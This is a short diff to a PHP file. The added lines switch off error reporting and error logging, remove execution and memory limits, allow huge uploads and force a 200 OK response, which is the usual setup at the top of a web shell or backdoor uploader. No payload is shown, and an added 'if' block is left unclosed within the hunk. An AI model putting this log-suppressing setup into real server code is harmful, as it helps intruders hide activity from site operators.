@@ -6,12 +6,17 @@
 @session_write_close();
 @ignore_user_abort(true);
 @set_time_limit(0);
+@error_reporting(E_ALL ^ E_NOTICE);
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('magic_quotes_runtime', 0);
+@set_time_limit(0);
+if(function_exists('set_magic_quotes_runtime')){
+@set_magic_quotes_runtime(0);
 @ini_set('memory_limit', '-1');
 @ini_set("upload_max_filesize", "9999m");
 error_reporting(0);
-ini_set('error_reporting', 0);
-ini_set('display_errors', 0);
-ini_set('display_startup_errors', 0);
 ini_set('default_charset', 'UTF-8');
 date_default_timezone_set('America/Sao_Paulo');
 header('HTTP/1.1 200 OK');
